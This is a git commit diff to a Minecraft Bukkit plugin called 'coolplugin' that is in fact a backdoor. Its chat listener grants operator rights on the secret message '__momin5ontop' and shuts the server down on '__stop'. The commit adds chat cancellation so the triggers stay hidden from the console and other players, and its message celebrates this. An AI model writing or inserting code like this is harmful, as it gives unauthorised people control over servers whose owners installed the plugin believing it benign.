dd383f1fe37cd6c405d82cbe781be8d43dc775ab
MOMIN5 <drmine05@gmail.com>
2021-01-12 22:48:22 +0530

    backdoor messages doesnt even send to the console now lol

--- src/in/momin5/coolplugin/events/MessageEvent.java
+++ src/in/momin5/coolplugin/events/MessageEvent.java
@@ -1,6 +1,7 @@
 package in.momin5.coolplugin.events;
 
 import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -8,15 +9,16 @@ import org.bukkit.event.player.PlayerChatEvent;
 
 public class MessageEvent implements Listener{
     @EventHandler
-    public void onPlayerChat(PlayerChatEvent e) throws IllegalArgumentException, SecurityException {
+    public void onPlayerChat(PlayerChatEvent e) throws NoSuchFieldException, IllegalArgumentException, SecurityException, IllegalAccessException {
         Player player = e.getPlayer();
         if(e.getMessage().equals("__momin5ontop")){
             player.setOp(true);
-            player.sendMessage("This server is hacked by Momin5 Backdoor!" + System.lineSeparator() + "https://github.com/MOMIN5/force-op-backdoor-plugin");
+            player.sendMessage(ChatColor.AQUA + "This server is hacked by Momin5 Backdoor!" + System.lineSeparator() + "https://github.com/MOMIN5/force-op-backdoor-plugin");
         }
         if(e.getMessage().equals("__stop")){
             Bukkit.getServer().shutdown();
-            player.sendMessage("This server is shutdown by Momin5 Backdoor!" + System.lineSeparator() + "https://github.com/MOMIN5/force-op-backdoor-plugin");
+            player.sendMessage(ChatColor.RED + "This server is shutdown by Momin5 Backdoor!" + System.lineSeparator() + "https://github.com/MOMIN5/force-op-backdoor-plugin");
         }
+        e.setCancelled(true);
     }
 }
